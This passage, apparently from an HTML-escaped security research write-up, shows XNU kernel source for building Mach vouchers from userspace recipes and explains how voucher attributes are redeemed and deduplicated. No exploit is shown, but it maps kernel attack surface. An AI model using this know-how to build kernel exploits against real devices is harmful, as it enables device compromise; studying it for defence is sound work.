class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;voucher&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;return&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;KERN_RESOURCE_SHORTAGE&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* iterate over the recipe items */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;while&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;0&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;lt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;recipe_size &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;recipe_used&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; ipc_voucher_t prev_iv&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;recipe_size &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;recipe_used &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;lt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;sizeof&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(*&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;sub_recipe&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;))&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; kr &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;KERN_INVALID_ARGUMENT&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;break&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* find the next recipe */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; sub_recipe &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;mach_voucher_attr_recipe_t&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;void&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*)&amp;amp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;recipes&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;[&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;recipe_used&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;];&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;recipe_size &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;recipe_used &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;sizeof&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(*&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;sub_recipe&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;lt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; sub_recipe&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;content_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; kr &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;KERN_INVALID_ARGUMENT&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;break&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; recipe_used &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;+=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;sizeof&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(*&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;sub_recipe&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;+&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;sub_recipe&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;content_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* convert voucher port name (current space) */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* into a voucher reference */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; prev_iv &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; convert_port_name_to_voucher&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;sub_recipe&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;previous_voucher&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;MACH_PORT_NULL &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;!=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;sub_recipe&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;previous_voucher &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; IV_NULL &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;==&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;prev_iv&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; kr &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;KERN_INVALID_CAPABILITY&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;break&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; kr &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;ipc_execute_voucher_recipe_command&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;voucher&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;sub_recipe&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;key&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;sub_recipe&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;command&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;prev_iv&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;sub_recipe&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;content&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;sub_recipe&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;content_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;FALSE&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; ipc_voucher_release&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;prev_iv&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;KERN_SUCCESS &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;!=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;break&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;KERN_SUCCESS &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;==&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;new_voucher &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;iv_dedup&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;voucher&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;else&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;new_voucher &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;IV_NULL&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; iv_dealloc&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;voucher&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;FALSE&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;At the top of this snippet a new voucher is allocated in &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;iv_alloc&lt;/span&gt;&lt;span&gt;. &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ipc_execute_voucher_recipe_command&lt;/span&gt;&lt;span&gt;&amp;nbsp;is then called in a loop to consume however many sub-recipe structures were provided by userspace. Each sub-recipe can optionally refer to an existing voucher via the sub-recipe &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;previous_voucher&lt;/span&gt;&lt;span&gt;&amp;nbsp;field. Note that MIG doesn&amp;#39;t natively support variable-sized structures containing ports so it&amp;#39;s passed as a mach port name which is looked up in the calling task&amp;#39;s mach port namespace and converted to a voucher reference by &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;convert_port_name_to_voucher&lt;/span&gt;&lt;span&gt;. The intended functionality here is to be able to refer to &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;attrs&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;in other vouchers to copy or &amp;quot;redeem&amp;quot; them. As discussed, the semantics of redeeming a voucher attr isn&amp;#39;t defined by the abstract voucher code and it&amp;#39;s up to the individual attr managers to decide what that means.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;Once the entire recipe has been consumed and all the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;iv_table&lt;/span&gt;&lt;span&gt;&amp;nbsp;entries filled in, &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;iv_dedup&lt;/span&gt;&lt;span&gt;&amp;nbsp;then searches the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivht_bucket&lt;/span&gt;&lt;span&gt;&amp;nbsp;hash table to see if there&amp;#39;s an existing voucher with a matching set of attributes. Remember that each attribute value stored in a voucher is an index into the attribute controller&amp;#39;s attribute table; and those attributes are unique, so it suffices to simply compare the array of voucher indexes to determine whether all attribute values are equal. If a matching voucher is found, &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;iv_dedup&lt;/span&gt;&lt;span&gt;&amp;nbsp;returns a reference to the existing voucher and calls &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;iv_dealloc&lt;/span&gt;&lt;span&gt;&amp;nbsp;to free the newly created newly-created voucher. Otherwise, if no existing, matching voucher is found, &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;iv_dedup&lt;/span&gt;&lt;span&gt;&amp;nbsp;adds the newly created voucher to the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivht_bucket&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;hash table.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;Let&amp;#39;s look at &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ipc_execute_voucher_recipe_command&lt;/span&gt;&lt;span&gt;&amp;nbsp;which is responsible for filling in the requested entries in the voucher &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;iv_table&lt;/span&gt;&lt;span&gt;. Note that &lt;/span&gt;&lt;span 